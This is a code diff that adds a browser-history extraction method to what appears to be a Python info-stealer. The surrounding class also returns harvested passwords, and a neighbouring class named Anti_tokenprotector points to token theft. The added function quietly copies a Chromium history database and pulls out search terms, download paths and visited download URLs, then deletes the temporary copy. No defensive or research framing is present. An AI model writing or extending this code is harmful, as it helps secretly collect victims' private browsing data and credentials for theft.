@@ -79,6 +79,37 @@ class Extract:
         except: pass
 
         return passwords
+    
+    def extractHistory(self, historyFile: str):
+        terms = []
+        visited = []
+        downloads = {}
+        history = {"terms": terms, "download": downloads, "visited": visited}
+
+        tempfile = utils.random_string.get(10)
+        shutil.copy(historyFile, tempfile)
+        db = sqlite3.connect(tempfile)
+        cursor = db.cursor()
+        cursor.execute("select term from keyword_search_terms")
+
+        for row in cursor.fetchall():
+                terms.append(row[0])
+        
+        cursor.execute("select current_path, tab_url from downloads")
+        for row in cursor.fetchall():
+                downloads[row[0]] = row[1]
+
+        cursor.execute("select url from downloads_url_chains")
+        for row in cursor.fetchall():
+                visited.append(row[0])
+
+        cursor.close()
+        db.close()
+
+        try: os.remove(tempfile)
+        except: pass
+
+        return history
 
 
 class Anti_tokenprotector:
